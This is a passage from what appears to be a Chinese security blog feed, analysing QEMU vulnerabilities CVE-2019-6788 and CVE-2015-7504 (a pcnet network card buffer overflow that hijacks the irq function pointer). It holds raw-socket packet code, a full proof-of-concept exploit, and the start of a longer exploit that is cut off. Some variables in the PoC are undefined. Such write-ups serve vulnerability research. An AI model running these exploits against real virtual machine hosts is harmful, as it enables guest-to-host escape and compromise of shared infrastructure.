IP4_HDRLEN); // TCP header // Source port number (16 bits) tcphdr.th_sport = htons(60); // Destination port number (16 bits) tcphdr.th_dport = htons(80); // Sequence number (32 bits) tcphdr.th_seq = htonl(0); // Acknowledgement number (32 bits) tcphdr.th_ack = htonl(0); // Reserved (4 bits): should be 0 tcphdr.th_x2 = 0; // Data offset (4 bits): size of TCP header in 32-bit words tcphdr.th_off = TCP_HDRLEN / 4; // Flags (8 bits) // FIN flag (1 bit) tcp_flags[0] = 0; // SYN flag (1 bit) tcp_flags[1] = 0; // RST flag (1 bit) tcp_flags[2] = 0; // PSH flag (1 bit) tcp_flags[3] = 1; // ACK flag (1 bit) tcp_flags[4] = 1; // URG flag (1 bit) tcp_flags[5] = 0; // ECE flag (1 bit) tcp_flags[6] = 0; // CWR flag (1 bit) tcp_flags[7] = 0; tcphdr.th_flags = 0; for (i = 0; i &lt; 8; i++) &#123; tcphdr.th_flags += (tcp_flags[i] &lt;&lt; i); &#125; // Window size (16 bits) tcphdr.th_win = htons(65535); // Urgent pointer (16 bits): 0 (only valid if URG flag is set) tcphdr.th_urp = htons(0); // TCP checksum (16 bits) tcphdr.th_sum = tcp4_checksum(iphdr, tcphdr, (uint8_t *)payload, payloadlen); // Prepare packet. // First part is an IPv4 header. memcpy(packet, &amp;iphdr, IP4_HDRLEN * sizeof(uint8_t)); // Next part of packet is upper layer protocol header. memcpy((packet + IP4_HDRLEN), &amp;tcphdr, TCP_HDRLEN * sizeof(uint8_t)); // Last part is upper layer protocol data. memcpy((packet + IP4_HDRLEN + TCP_HDRLEN), payload, payloadlen * sizeof(uint8_t)); // The kernel is going to prepare layer 2 information (ethernet frame // header) for us. For that, we need to specify a destination for the kernel // in order for it to decide where to send the raw datagram. We fill in a // struct in_addr with the desired destination IP address, and pass this // structure to the sendto() function. memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = iphdr.ip_dst.s_addr; // Submit request for a raw socket descriptor. if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) &#123; perror("socket() failed "); exit(EXIT_FAILURE); &#125; // Set flag so socket expects us to provide IPv4 header. if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) &lt; 0) &#123; perror("setsockopt() failed to set IP_HDRINCL "); exit(EXIT_FAILURE); &#125; // Bind socket to interface index. if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, sizeof(ifr)) &lt; 0) &#123; perror("setsockopt() failed to bind to interface "); exit(EXIT_FAILURE); &#125; // Send packet. if (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, 0, (struct sockaddr *)&amp;sin, sizeof(struct sockaddr)) &lt; 0) &#123; perror("sendto() failed "); exit(EXIT_FAILURE); &#125; // Close socket descriptor. close(sd); // Free allocated memory. free(packet); free(interface); free(src_ip); free(dst_ip); free(ip_flags); free(tcp_flags); free(payload);&#125;// Computing the internet checksum (RFC 1071).// Note that the internet checksum does not preclude collisions.uint16_t checksum(uint16_t *addr, int len) &#123; int count = len; register uint32_t sum = 0; uint16_t answer = 0; // Sum up 2-byte values until none or only one byte left. while (count &gt; 1) &#123; sum += *(addr++); count -= 2; &#125; // Add left-over byte, if any. if (count &gt; 0) &#123; sum += *(uint8_t *)addr; &#125; // Fold 32-bit sum into 16 bits; we lose information by doing this, // increasing the chances of a collision. // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits) while (sum &gt;&gt; 16) &#123; sum = (sum &amp; 0xffff) + (sum &gt;&gt; 16); &#125; // Checksum is one's compliment of sum. answer = ~sum; return (answer);&#125;// Build IPv4 ICMP pseudo-header and call checksum function.uint16_t icmp4_checksum(struct icmp icmphdr, uint8_t *payload, int payloadlen) &#123; char buf[IP_MAXPACKET]; char *ptr; int chksumlen = 0; int i; ptr = &amp;buf[0]; // ptr points to beginning of buffer buf // Copy Message Type to buf (8 bits) memcpy(ptr, &amp;icmphdr.icmp_type, sizeof(icmphdr.icmp_type)); ptr += sizeof(icmphdr.icmp_type); chksumlen += sizeof(icmphdr.icmp_type); // Copy Message Code to buf (8 bits) memcpy(ptr, &amp;icmphdr.icmp_code, sizeof(icmphdr.icmp_code)); ptr += sizeof(icmphdr.icmp_code); chksumlen += sizeof(icmphdr.icmp_code); // Copy ICMP checksum to buf (16 bits) // Zero, since we don't know it yet *ptr = 0; ptr++; *ptr = 0; ptr++; chksumlen += 2; // Copy Identifier to buf (16 bits) memcpy(ptr, &amp;icmphdr.icmp_id, sizeof(icmphdr.icmp_id)); ptr += sizeof(icmphdr.icmp_id); chksumlen += sizeof(icmphdr.icmp_id); // Copy Sequence Number to buf (16 bits) memcpy(ptr, &amp;icmphdr.icmp_seq, sizeof(icmphdr.icmp_seq)); ptr += sizeof(icmphdr.icmp_seq); chksumlen += sizeof(icmphdr.icmp_seq); // Copy payload to buf memcpy(ptr, payload, payloadlen); ptr += payloadlen; chksumlen += payloadlen; // Pad to the next 16-bit boundary for (i = 0; i &lt; payloadlen % 2; i++, ptr++) &#123; *ptr = 0; ptr++; chksumlen++; &#125; return checksum((uint16_t *)buf, chksumlen);&#125;// Build IPv4 TCP pseudo-header and call checksum function.uint16_t tcp4_checksum(struct ip iphdr, struct tcphdr tcphdr, uint8_t *payload, int payloadlen) &#123; uint16_t svalue; char buf[IP_MAXPACKET], cvalue; char *ptr; int i, chksumlen = 0; // ptr points to beginning of buffer buf ptr = &amp;buf[0]; // Copy source IP address into buf (32 bits) memcpy(ptr, &amp;iphdr.ip_src.s_addr, sizeof(iphdr.ip_src.s_addr)); ptr += sizeof(iphdr.ip_src.s_addr); chksumlen += sizeof(iphdr.ip_src.s_addr); // Copy destination IP address into buf (32 bits) memcpy(ptr, &amp;iphdr.ip_dst.s_addr, sizeof(iphdr.ip_dst.s_addr)); ptr += sizeof(iphdr.ip_dst.s_addr); chksumlen += sizeof(iphdr.ip_dst.s_addr); // Copy zero field to buf (8 bits) *ptr = 0; ptr++; chksumlen += 1; // Copy transport layer protocol to buf (8 bits) memcpy(ptr, &amp;iphdr.ip_p, sizeof(iphdr.ip_p)); ptr += sizeof(iphdr.ip_p); chksumlen += sizeof(iphdr.ip_p); // Copy TCP length to buf (16 bits) svalue = htons(sizeof(tcphdr) + payloadlen); memcpy(ptr, &amp;svalue, sizeof(svalue)); ptr += sizeof(svalue); chksumlen += sizeof(svalue); // Copy TCP source port to buf (16 bits) memcpy(ptr, &amp;tcphdr.th_sport, sizeof(tcphdr.th_sport)); ptr += sizeof(tcphdr.th_sport); chksumlen += sizeof(tcphdr.th_sport); // Copy TCP destination port to buf (16 bits) memcpy(ptr, &amp;tcphdr.th_dport, sizeof(tcphdr.th_dport)); ptr += sizeof(tcphdr.th_dport); chksumlen += sizeof(tcphdr.th_dport); // Copy sequence number to buf (32 bits) memcpy(ptr, &amp;tcphdr.th_seq, sizeof(tcphdr.th_seq)); ptr += sizeof(tcphdr.th_seq); chksumlen += sizeof(tcphdr.th_seq); // Copy acknowledgement number to buf (32 bits) memcpy(ptr, &amp;tcphdr.th_ack, sizeof(tcphdr.th_ack)); ptr += sizeof(tcphdr.th_ack); chksumlen += sizeof(tcphdr.th_ack); // Copy data offset to buf (4 bits) and // copy reserved bits to buf (4 bits) cvalue = (tcphdr.th_off &lt;&lt; 4) + tcphdr.th_x2; memcpy(ptr, &amp;cvalue, sizeof(cvalue)); ptr += sizeof(cvalue); chksumlen += sizeof(cvalue); // Copy TCP flags to buf (8 bits) memcpy(ptr, &amp;tcphdr.th_flags, sizeof(tcphdr.th_flags)); ptr += sizeof(tcphdr.th_flags); chksumlen += sizeof(tcphdr.th_flags); // Copy TCP window size to buf (16 bits) memcpy(ptr, &amp;tcphdr.th_win, sizeof(tcphdr.th_win)); ptr += sizeof(tcphdr.th_win); chksumlen += sizeof(tcphdr.th_win); // Copy TCP checksum to buf (16 bits) // Zero, since we don't know it yet *ptr = 0; ptr++; *ptr = 0; ptr++; chksumlen += 2; // Copy urgent pointer to buf (16 bits) memcpy(ptr, &amp;tcphdr.th_urp, sizeof(tcphdr.th_urp)); ptr += sizeof(tcphdr.th_urp); chksumlen += sizeof(tcphdr.th_urp); // Copy payload to buf memcpy(ptr, payload, payloadlen); ptr += payloadlen; chksumlen += payloadlen; // Pad to the next 16-bit boundary for (i = 0; i &lt; payloadlen % 2; i++, ptr++) &#123; *ptr = 0; ptr++; chksumlen++; &#125; return checksum((uint16_t *)buf, chksumlen);&#125;// Allocate memory for an array of chars.char *allocate_strmem(int len) &#123; char *tmp; if (len &lt;= 0) &#123; dbg_printf("ERROR: Cannot allocate memory because len = %i in " "allocate_strmem().\n", len); exit(EXIT_FAILURE); &#125; tmp = (char *)malloc(len * sizeof(char)); if (tmp != NULL) &#123; memset(tmp, 0, len * sizeof(char)); return (tmp); &#125; else &#123; dbg_printf( "ERROR: Cannot allocate memory for array allocate_strmem().\n"); exit(EXIT_FAILURE); &#125;&#125;// Allocate memory for an array of unsigned chars.uint8_t *allocate_ustrmem(int len) &#123; uint8_t *tmp; if (len &lt;= 0) &#123; dbg_printf("ERROR: Cannot allocate memory because len = %i in " "allocate_ustrmem().\n", len); exit(EXIT_FAILURE); &#125; tmp = (uint8_t *)malloc(len * sizeof(uint8_t)); if (tmp != NULL) &#123; memset(tmp, 0, len * sizeof(uint8_t)); return (tmp); &#125; else &#123; dbg_printf( "ERROR: Cannot allocate memory for array allocate_ustrmem().\n"); exit(EXIT_FAILURE); &#125;&#125;// Allocate memory for an array of ints.int *allocate_intmem(int len) &#123; int *tmp; if (len &lt;= 0) &#123; dbg_printf("ERROR: Cannot allocate memory because len = %i in " "allocate_intmem().\n", len); exit(EXIT_FAILURE); &#125; tmp = (int *)malloc(len * sizeof(int)); if (tmp != NULL) &#123; memset(tmp, 0, len * sizeof(int)); return (tmp); &#125; else &#123; dbg_printf( "ERROR: Cannot allocate memory for array allocate_intmem().\n"); exit(EXIT_FAILURE); &#125;&#125;void hexdump(const char *desc, void *addr, int len) &#123; int i; unsigned char buff[17]; unsigned char *pc = (unsigned char *)addr; // Output description if given. if (desc != NULL) printf("%s:\n", desc); if (len == 0) &#123; printf(" ZERO LENGTH\n"); return; &#125; if (len &lt; 0) &#123; printf(" NEGATIVE LENGTH: %i\n", len); return; &#125; // Process every byte in the data. for (i = 0; i &lt; len; i++) &#123; // Multiple of 16 means new line (with line offset). if ((i % 16) == 0) &#123; // Just don't print ASCII for the zeroth line. if (i != 0) printf(" %s\n", buff); // Output the offset. printf(" %04x ", i); &#125; // Now the hex code for the specific character. printf(" %02x", pc[i]); // And store a printable ASCII character for later. if ((pc[i] &lt; 0x20) || (pc[i] &gt; 0x7e)) buff[i % 16] = '.'; else buff[i % 16] = pc[i]; buff[(i % 16) + 1] = '\0'; &#125; // Pad out last line if not exactly 16 characters. while ((i % 16) != 0) &#123; printf(" "); i++; &#125; // And print the final ASCII bit. printf(" %s\n", buff);&#125; 参考https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 https://github.com/0xKira/qemu-vm-escape/blob/master/exp.c http://couplee.wang/wnagzihxa1n/SecurityDaily/2020.04.04.html]]></content>
      <categories>
        <category>CVE分析</category>
      </categories>
      <tags>
        <tag>Qemu</tag>
        <tag>CVE分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2015-7504调试分析]]></title>
    <url>%2F2020%2F05%2F15%2FCVE-2015-7504%2F</url>
    <content type="text"><![CDATA[CVE-2015-7504此漏洞算是CVE-2015-5165的扩展。 前置知识CRC的用法作用及其逆向构造。 搭建环境和CVE-2015-5165一起搭建即可。 http://codemx.cn/2016/04/30/Understand01/ 漏洞分析漏洞点，pcnet.c:1082，pcnet_receive函数中，src数组的下标size未上限检测，进而导致的数组越界，p初始为src，while循环会不断p++直到p == &amp;src[size]才会停止，所以当size == 0x1000时(也是最大时)，跳出while循环的p已经指向了s-&gt;buffer的后面那个元素，查看得知其为一个结构体指针： 123456789101112131415161718192021222324typedef struct PCNetState_st PCNetState;struct PCNetState_st &#123; NICState *nic; NICConf conf; QEMUTimer *poll_timer; int rap, isr, lnkst; uint32_t rdra, tdra; uint8_t prom[16]; uint16_t csr[128]; uint16_t bcr[32]; int xmit_pos; uint64_t timer; MemoryRegion mmio; uint8_t buffer[4096]; qemu_irq irq; // &lt;==== here!!! void (*phys_mem_read)(void *dma_opaque, hwaddr addr, uint8_t *buf, int len, int do_bswap); void (*phys_mem_write)(void *dma_opaque, hwaddr addr, uint8_t *buf, int len, int do_bswap); void *dma_opaque; int tx_busy; int looptest;&#125;; 查找qemu_irq的定义，为IRQState的结构体指针： 12345678//typedef.h/* * Pointer types * Such typedefs should be limited to cases where the typedef's users * are oblivious of its "pointer-ness". * Please keep this list in case-insensitive alphabetical order. */typedef struct IRQState *qemu_irq; 再查看IRQState的元素结构，看到qemu_irq_handler元素带有handler字样，猜测其为函数指针： 12345678// /hw/core/irq.c:31struct IRQState &#123; Object parent_obj; qemu_irq_handler handler; void *opaque; int n;&#125;; 查看qemu_irq_handler定义，确认其的确为函数指针： 12// /hw/xtensa/irq.h:10typedef void (*qemu_irq_handler)(void *opaque, int n, int level); 由于IRQState中存在一个函数指针，使劫持执行流成为可能。 查找其引用发现在qemu_set_irq中被调用： 12345678// /hw/core/irq.cvoid qemu_set_irq(qemu_irq irq, int level)&#123; if (!irq) return; irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);&#125; 在查找qemu_set_irq的引用，发现在qemu_update_irq中被引用，再查找qemu_update_irq的引用，发现在pcnet_reveive的结束末尾处恰好调用了pcnet_update_irq： 123456789101112131415161718... while (pktcount--) &#123; if (CSR_RCVRC(s) &lt;= 1) CSR_RCVRC(s) = CSR_RCVRL(s); else CSR_RCVRC(s)--; &#125; pcnet_rdte_poll(s); &#125; &#125; pcnet_poll(s); pcnet_update_irq(s); //here &lt;=== !!! return size_;&#125; 所以漏洞触发链：pcnet_ioport_write=&gt;pcnet_ioport_writew=&gt;pcnet_csr_writew=&gt;pcnet_transmit=&gt;pcnet_receive 因为结构体跨越文件较多，所以这里可以用Understand等源码阅读器来搜索阅读结构体。 主要分为几个步骤： 配置pcnet网卡的各项数据。(我觉得最难理解的地方。。。我复现完对这一块仍然很疑惑，有的地方不知其原因) patch crc，构造数据包，原理在前置知识中给出。 将数据包地址填入tx_desc中并发送触发pcnet_transmit。 调试与pocpoc.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307#include &lt;assert.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#include &lt;limits.h&gt;#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;sys/io.h&gt;// 页面相关参数#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)#define page_aligned __attribute__((aligned(PAGE_SIZE)))#define PCNET_BUFFER_SIZE 4096#define PCNET_PORT 0xc100#define DRX 0x0001#define DTX 0x0002#define LOOP 0x0004#define DXMTFCS 0x0008#define INTL 0x0040#define DRCVPA 0x2000#define DRCVBC 0x4000#define PROM 0x8000#define CRC(crc, ch) (crc = (crc &gt;&gt; 8) ^ crctab[(crc ^ (ch)) &amp; 0xff])uint64_t get_physical_pfn(void* addr) &#123; uint64_t pfn = -1; FILE* fp = fopen("/proc/self/pagemap","rb"); if (!fp) &#123; return pfn; &#125; if (!fseek(fp,(unsigned long)addr/PAGE_SIZE*8,SEEK_SET)) &#123; fread(&amp;pfn,sizeof(pfn),1,fp); if (pfn &amp; PFN_PRESENT) &#123; pfn &amp;= PFN_PFN; &#125; &#125; fclose(fp); return pfn;&#125;uint64_t gva_to_gpa(void* addr) &#123; uint64_t pfn = get_physical_pfn(addr); return pfn * PAGE_SIZE + (uint64_t)addr % PAGE_SIZE;&#125;enum PCNET_registers &#123; RDP = 0x10, RAP = 0x12, RST = 0x14,&#125;;struct pcnet_config &#123; uint16_t mode; uint8_t rlen; uint8_t tlen; uint8_t mac[6]; uint16_t _reserved; uint8_t ladr[8]; uint32_t rx_desc; uint32_t tx_desc;&#125;;struct pcnet_desc &#123; uint32_t addr; int16_t length; int8_t status_1; int8_t status_2; uint32_t misc; uint32_t _reserved;&#125;;static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = &#123; 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x08, 0x00,&#125;;/* generated using the AUTODIN II polynomial * x^32 + x^26 + x^23 + x^22 + x^16 + * x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1 */static const uint32_t crctab[256] = &#123; 0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,&#125;;static int fd = -1;/* PCNET primitives */void pcnet_packet_patch_crc(uint8_t *packet, uint32_t current, uint32_t target)&#123; size_t i = 0, j; uint8_t *ptr; uint32_t workspace[2] = &#123; current, target &#125;; for (i = 0; i &lt; 2; i++) workspace[i] &amp;= (uint32_t)~0; ptr = (uint8_t *)(workspace + 1); for (i = 0; i &lt; 4; i++) &#123; j = 0; while(crctab[j] &gt;&gt; 24 != *(ptr + 3 - i)) j++; *((uint32_t *)(ptr - i)) ^= crctab[j]; *(ptr - i - 1) ^= j; &#125; strncpy(packet, ptr - 4, 4);&#125;uint64_t pcnet_card_config(struct pcnet_config *config, struct pcnet_desc *rx_desc, struct pcnet_desc *tx_desc)&#123; memset(config, 0, sizeof(struct pcnet_config)); config-&gt;mode = LOOP | PROM; strcpy(config-&gt;mac, "\xaa\xbb\xcc\xdd\xee\xff"); config-&gt;rlen = 0x0; config-&gt;tlen = 0x0; config-&gt;rx_desc = (uint32_t)gva_to_gpa(rx_desc); config-&gt;tx_desc = (uint32_t)gva_to_gpa(tx_desc); return gva_to_gpa(config);&#125;void pcnet_desc_config(struct pcnet_desc *desc, void *buffer, int is_rx)&#123; uint16_t bcnt = -PCNET_BUFFER_SIZE; bcnt &amp;= 0xfff; bcnt |= 0xf000; memset(desc, 0, sizeof(struct pcnet_desc)); memset(buffer, 0, PCNET_BUFFER_SIZE); desc-&gt;addr = (uint32_t)gva_to_gpa(buffer); desc-&gt;length = bcnt; if (is_rx) &#123; /* receive buffers owned by the card */ desc-&gt;status_2 = 0x80; &#125;&#125;void pcnet_packet_send(struct pcnet_desc *desc, void *buffer, void *packet, size_t len)&#123; if (len &lt;= PCNET_BUFFER_SIZE) &#123; memcpy(buffer, packet, len); /* set STP ENP ADDFCS bits */ desc-&gt;status_2 |= 0x23; len = (-len); len &amp;= 0xfff; len |= 0xf000; desc-&gt;length = len; /* flip ownership to card */ desc-&gt;status_2 |= 0x80; /* signal packet */ outw(0, PCNET_PORT + RAP); outw(0x8, PCNET_PORT + RDP); &#125;&#125;int main()&#123; fd = open("/proc/self/pagemap", O_RDONLY); if (fd &lt; 0) &#123; puts("open pagemap failed!"); exit(0); &#125; struct pcnet_config pcnet_config; uint32_t pcnet_config_mem; struct pcnet_desc pcnet_tx_desc page_aligned; struct pcnet_desc pcnet_rx_desc page_aligned; void *pcnet_rx_buffer, *pcnet_tx_buffer; uint32_t fcs = ~0; uint16_t lo, hi; pcnet_rx_buffer = (uint64_t *)aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE); pcnet_tx_buffer = (uint64_t *)aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE); /* setup rx */ pcnet_desc_config(&amp;pcnet_rx_desc, pcnet_rx_buffer, 1); /* setup tx */ pcnet_desc_config(&amp;pcnet_tx_desc, pcnet_tx_buffer, 0); /* setup pcnet config struct and get the physical address */ pcnet_config_mem = (uint32_t)pcnet_card_config(&amp;pcnet_config, &amp;pcnet_rx_desc, &amp;pcnet_tx_desc); lo = (uint16_t)pcnet_config_mem; hi = pcnet_config_mem &gt;&gt; 16; /* get the crc which value is fake_irq_addr */ uint32_t fake_irq_addr = (pcnet_buffer_addr+0x10-0x30) &amp; 0xffffffff; /* compute required crc */ c_ptr = pcnet_packet; while (c_ptr != &amp;pcnet_packet[PCNET_BUFFER_SIZE - 4]) CRC(fcs, *c_ptr++); pcnet_packet_patch_crc(c_ptr, fcs, htonl(0xdeadbeef)); /* soft reset */ inl(PCNET_PORT + 0x18); /* set swstyle */ outw(58, PCNET_PORT + RAP); outw(0x0102, PCNET_PORT + RDP); /* card config */ outw(1, PCNET_PORT + RAP); outw(lo, PCNET_PORT + RDP); outw(2, PCNET_PORT + RAP); outw(hi, PCNET_PORT + RDP); /* init and start */ outw(0, PCNET_PORT + RAP); outw(0x3, PCNET_PORT + RDP); sleep(2); // trigger the vuln and execute system("cat flag") pcnet_packet_send(&amp;pcnet_tx_desc, pcnet_tx_buffer, pcnet_packet, PCNET_BUFFER_SIZE); return 0;&#125; 漏洞利用因为我们只能覆盖irq这个结构体指针的后四个字节，所以我们没办法完全将其劫持到fake_struct上，只能在其原来位于的地址附近伪造，其原地址是main_arena上的堆地址，所以我们必须泄露出heap_base，这个是有概率的，且不像phy_base &amp; text_base这么稳定，其次因为设备的PCNetState也是在main_arena的堆上的，所以我们可以在s-&gt;buffer中伪造fake_IRQState，然后将irq劫持到fake_IRQState上。 在实际调试时遇到的两个问题： 触发链的问题，经过审源码发现，pcnet_transmit并非只有上面所提到的那一条链，在pcnet_poll_timer=&gt;pcnet_poll=&gt;pcnet_transmit这条链中也可触发，pcnet_poll_timer像是一个定时检查txpoll，判断tx_desc的buf中是否存在未发送的数据的函数，但是由于调试时的时间很不稳定，所以我自己在尝试时有时在这里可以直接触发，无需再在pcnet_writew里构造触发，有时又需要自己构造触发。 pcnet_buffer与heap_base的偏移不稳定，也就是设备结构体的地址与heap_base的地址之间的偏移经常不固定，但是我看别人的exp都没有提这个问题，但是我自己是真的遇到了这个问题，所以我自己打的时候不是很稳定。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668#include &lt;assert.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#include &lt;limits.h&gt;#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;sys/io.h&gt;// 页面相关参数#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) 